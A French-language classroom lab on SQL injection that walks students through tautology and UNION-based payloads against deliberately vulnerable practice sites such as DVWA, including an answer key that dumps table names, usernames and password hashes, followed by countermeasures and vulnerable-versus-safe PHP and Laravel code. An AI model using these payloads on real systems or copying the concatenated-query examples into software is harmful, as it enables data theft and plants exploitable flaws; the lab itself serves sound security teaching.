# TP Injection SQL 💉

## 1. Les grands principes : Exploiter la faille SQL

**🎯 Objectif :** accéder aux données sans connaître les identifiants réels.

**💉 Definition :** Une injection SQL est un type d'exploitation d'une faille de sécurité d'une application interagissant avec une base de données, en injectant une requête SQL non prévue par le système et pouvant compromettre sa sécurité.

**🚧 Principes de bases :** provoquer des erreurs SQL pour faire apparâitre de nouvelles informations dans la pile d'execution des erreurs.

**Conséquences** : 

* Vol de données sensibles (mots de passe, numéros de CB).
* Modification ou suppression de données.
* Prise de contrôle du serveur (si escalade possible).

### 1.1 Gérer le SQL

On va commencer par regarder dans le SGBD comment se comportent les requêtes. <br />

Dans MySQL, créez une base `demo` et créer la table ci dessous (tout ne sert pas pour ce TP mais nous l'utiliserons dans un TP sur l'authenification).

Créez la table `users` :

```sql
CREATE TABLE IF NOT EXISTS users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  email VARCHAR(255) NOT NULL UNIQUE,
  password_hash VARCHAR(255) NOT NULL,
  mfa_secret VARCHAR(64) DEFAULT NULL,
  mfa_enabled TINYINT(1) NOT NULL DEFAULT 0,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
```

Commmençons par une requête simple que pourrait envoyer une application vulnérable :
```sql
SELECT * FROM users WHERE id = '1';
```

⚠️ Comme MySQL est strict, tu vas déclencher des erreurs de syntaxe ou retourner trop de résultats.

exemple 1 : `SELECT * FROM users WHERE id = '1' OR '1'='1';`<br />
👉 Retourne toutes les lignes de la table users (bypass authentification).

exemple 2 :`SELECT * FROM users WHERE id = '' OR 1=1 -- ';`<br />
👉 Ici ``--`` commente la suite → tout le reste de la requête est ignoré.<br />
⚠️ Si tu oublies l’espace après ``-- ``, tu auras une erreur de syntaxe.

exemple 3 : `SELECT * FROM users WHERE id = 'admin' -- ';`<br />
👉 MySQL interprète admin comme valeur, puis le ``--`` coupe la fin.<br />
Peut générer une erreur si le champ id est numérique (conversion implicite).

❌ On peut aussi provoquer des erreurs : 

```sql
-- Oubli de fermeture de quote
SELECT * FROM users WHERE id = '1;
```
ou
```sql
-- Injection avec mauvais commentaire
SELECT * FROM users WHERE id = '1' OR '1'='1' --;
```
ou 
```sql
-- Type incompatible
SELECT * FROM users WHERE id = 'admin';
```

👉 En résumé, 

* Si l’injection est bien formée → ça contourne la logique (retourne plusieurs résultats).
* Si elle est mal formée → ça génère des erreurs SQL (très utiles pour un attaquant car elles révèlent la structure de la base).

!!! note "Injection"
    Une injection SQL est loin d'être simple à mener. Cela demande à ce que le site soit vulnérable au requêtes concaténées et c'est de moins en moins le cas.

### 1.2 Première approche : hackingarticles

En vous aidant du "tuto" suivant : [hackingarticles : manual-sql-injection-exploitation-step-step](https://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/), essayer de mener une attaque sur le site d'apprentissage [Acunetix](http://testphp.vulnweb.com/artists.php?artist=1)

!!! question "Entrainement"
    ![secure bank](./data/injectionSQL.png){: width=40% .center}

    Vous pouvez essayer de transposer ce que le tuto de Hackingarticles vous a appris pour essayer sur le site : [Hack Splaining](https://www.hacksplaining.com/exercises/sql-injection).

### 1.3 Deuxième approche : DVWA

Damn Vulnerable Web Application (DVWA) est une application web PHP/MariaDB volontairement très vulnérable.
Son objectif principal est :

- d’aider les professionnels de la sécurité à tester leurs compétences et leurs outils dans un environnement légal
- d’aider les développeurs web à mieux comprendre les mécanismes de sécurisation des applications web,
- de servir de support aux étudiants et aux enseignants pour apprendre la sécurité des applications web dans un cadre pédagogique contrôlé.

[Lien vers le dépot GitHub 🔽 ](https://github.com/digininja/DVWA)

??? note "How To install"

    - Place le dossier DVWA dans le répertoire `C:\wamp64\www\`
    - Dans le dossier DVWA/config/, copie le fichier : config.inc.php.dist  →  config.inc.php
    - Ouvre ``config.inc.php`` et ajuste la config :

        ```php
        $_DVWA[ 'db_user' ] = 'root';
        $_DVWA[ 'db_password' ] = '';   // par défaut root n’a PAS de mot de passe sous WAMP
        $_DVWA[ 'db_database' ] = 'dvwa';
        ```
    - Activer ``allow_url_include`` et ``gd`` dans `php.ini` :   Active/supprime le ``;`` si présent

        ```php
        allow_url_include = On
        allow_url_fopen = On
        extension=gd
        ```
    - Crée une nouvelle base appelée **dvwa**
    - Lancer http://localhost/DVWA/setup.php > Create / Reset Database
    - Connecte-toi avec : **Login** : admin et **Password** : password

    Pour finir : Régler le niveau de sécurité<br />
    Dans le menu DVWA → DVWA Security → choisis **Low** pour débuter.<br />


1.	Tester un User Id.
2.	Quelle est la page exécutée ?
3.	Donner la requête SQL exécutée ?
4.	Reproduire chaque étape comme précédemment et réaliser une documentation au fur et à mesure avec les explications détaillées et la requête SQL associée.


??? info "Element de correction"

    1. Test de vulnérabilité : En tapant simplement 1 dans le champ libre.
    2. Pour afficher tous les utilisateurs : `%' or '0'='0'` pour avoir une requête toujours vraie
    3. Afficher la version de la base de données : `%' or 0=0 union select null, version() #` (Dans la dernière ligne affichée, 10.1.28-MariaDB est affichée dans SURNAME c'est la version de MYSQL database.)
    4. Afficher toutes les tables INFORMATION_SCHEMA : `%' and 1=0 union select null, table_name from information_schema.tables #` (L’INFORMATION_SCHEMA est la base de données, l'endroit qui stocke des informations sur toutes les autres bases de données que le serveur MySQL entretient.)
    5. Afficher toutes les tables utilisateur d’INFORMATION_SCHEMA : `%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#` (toutes les tables qui commencent par le préfixe « user »
    dans la base de données INFORMATION_SCHEMA.)
    6. Afficher tous les champs de colonnes dans la table user d’INFORMATION_SCHEMA : `%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #` (toutes les colonnes dans la table users. Il y a les colonnes user_id, first_name, last_name, user et Password.)
    7. Afficher tous les contenus de champs de colonnes dans la table user d’INFORMATION_SCHEMA : `%'and 1=0 union select
    null,concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #`

    nous avons réussi à montrer toutes les informations d'authentification nécessaires dans cette base de données. Il suffit de les décoder avec Hashkiller par exemple. Ici le mot de passe admin est : `password`

## 2. Contre-Mesures

Que faire pour empêcher ce type d'attaque ?

- Échapper ou paramétrer correctement les requêtes SQL (requêtes préparées avec PDO ou MySQLi)
- Ne jamais faire confiance aux données utilisateur
- Journaliser les tentatives suspectes
- Utiliser un WAF (pare-feu applicatif)

### 3.1 Utiliser des requêtes préparées (PDO, mysqli, etc.) ✅

**Principe :** au lieu de concaténer directement les entrées utilisateur dans une requête SQL, on prépare une requête avec des paramètres qui seront remplacés de manière sécurisée par la base de données.

Exemple vulnérable (PHP + mysqli) :

```php
$sql = "SELECT * FROM users WHERE email = '" . $_POST['email'] . "' 
        AND password = '" . $_POST['password'] . "'";
$result = $conn->query($sql);
```

Exemple sécurisé (PHP + PDO) :

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = :email AND password = :password");
$stmt->execute([
    ':email' => $_POST['email'],
    ':password' => $_POST['password']
]);
$user = $stmt->fetch();
```

👉 Ici, même si l’utilisateur saisit admin' OR '1'='1, la valeur est traitée comme une chaîne littérale et non comme du SQL.

### 3.2 Échapper correctement les données ✅

Lorsque les requêtes préparées ne sont pas possibles (ex. scripts rapides), il faut échapper les caractères spéciaux (', ", ;, etc.).

Avec PHP/MySQLi :

```php
$email = mysqli_real_escape_string($conn, $_POST['email']);
```
⚠️ Limite : ce n’est pas une solution infaillible, car un oubli ou une mauvaise configuration peut réintroduire une faille. Les requêtes préparées restent la solution recommandée.

### 3.3 Appliquer le principe du moindre privilège ✅

Le compte SQL utilisé par l’application ne doit pas avoir plus de droits que nécessaire.

Mauvaise pratique (dangereuse) :
```sql
GRANT ALL PRIVILEGES ON *.* TO 'appuser'@'localhost';
```

Bonne pratique :
```sql
GRANT SELECT, INSERT, UPDATE ON mydb.users TO 'appuser'@'localhost';
```

### 3.4 Contrôle des données côté serveur ✅

❗ Toujours valider les entrées utilisateurs, même si tu as une validation côté client (JavaScript).

Exemple :

- Vérifier qu’un id est bien un entier (is_numeric en PHP).
- Vérifier qu’un email a un format correct (REGEX, filtre PHP filter_var).

Exemple en PHP :

```php
if (!filter_var($_POST['email'], FILTER_VALIDATE_EMAIL)) {
    die("Adresse email invalide !");
}
```
👉 Cela réduit le risque d’injection et évite aussi des erreurs applicatives.

⁉️ Pourquoi ce type de faille est toujours fréquent ?

- Héritage d’applications anciennes
- Mauvaises pratiques de développement
- Manque de formation en cybersécurité
- Erreurs de configuration

## 4. Le cas bijoo

Visualisez l'ensemble des produits de la catégorie *Montres*, observez bien l'url d'appel [http://localhost/breizhsecu/catalogue.php?cat=1](http://localhost/breizhsecu/catalogue.php?cat=1)

Vous allez désormais modifier l'url d'appel en remplaçant le ``1`` par ``1 or true``

Que constatez-vous ? De quelles catégories viennent les produits que vous pouvez voir ?  Quel est le nom de la catégorie affiché en haut de page ?

et il y a bien d'autres failles SQL sur le site 😵 ...

visualisez le détail de la commande que vous avez créée lors de votre découverte du site, observez bien l'URL appelée. Appelez maintenant directement cette URL en changeant le paramètre pour y mettre la valeur 1.
Que constatez-vous ? A qui appartient cette commande ?

!!! question "Travail à faire" 

    1. Modifier la page catalogue.php de façon que l'on ne puisse pas avoir d'injection et voir d'autres catégories que celles prévues.
    2. Sur la page du détail d'une commande lorsqu'on est logué, on peut accéder au détail d'une commande qui n'est pas à soi.
    3. Corrigez le code de la page pour que l’on soit redirigé vers une page "vous n'avez pas accès" si la commande n'appartient pas à la personne loguée.
    4. De la même façon, corrigez le script de suppression des avis qui ne doit fonctionner que lorsqu'on est connecté et que l’on souhaite supprimer son propre avis.

## 5. Le cas de Laravel 

### 5.1 Laravel et la protection par défaut

Laravel utilise Eloquent ORM et le Query Builder, qui intègrent nativement les requêtes préparées.

Exemple avec Eloquent :
```php
User::where('email', $email)->first();
```
👉 Ici, Laravel prépare la requête automatiquement → l’entrée ``$email`` est traitée comme une valeur et non comme du SQL.

Même chose avec le Query Builder :

```php
DB::table('users')->where('id', $id)->get();
```
👉 Protégé contre l’injection SQL.

### 5.2 Alors, injection impossible ?

👉 Pas totalement. Laravel protège bien si on utilise correctement Eloquent ou Query Builder.

Mais on peut réintroduire une faille si :

a) **On Utilise des requêtes brutes** (raw queries)
```php
DB::select("SELECT * FROM users WHERE email = '$email'");
```
➡️ Ici, on retombe exactement dans la vulnérabilité classique.

Laravel propose une variante plus sûre :
```php
DB::select("SELECT * FROM users WHERE email = ?", [$email]);
```
👉 Ici, c’est une requête préparée. 👏👏👏

b) **Mauvaise utilisation de fonctions “raw”**

Certaines méthodes permettent d’injecter du SQL “pur” :
```php
DB::table('users')
  ->whereRaw("email = '$email'")
  ->get();
```
👉 Si ``$email`` vient d’un formulaire utilisateur non filtré, c’est vulnérable.

!!! warning "Et le developpeur ..."

    Laravel protège par défaut contre l’injection SQL (via ORM et requêtes préparées).

    Mais la faille réapparaît si le développeur contourne le framework avec des requêtes brutes ou des ``whereRaw()`` mal utilisés.

    👉 Le problème reste **humain**, pas technique : le framework fournit les outils, mais c’est au développeur de les utiliser correctement.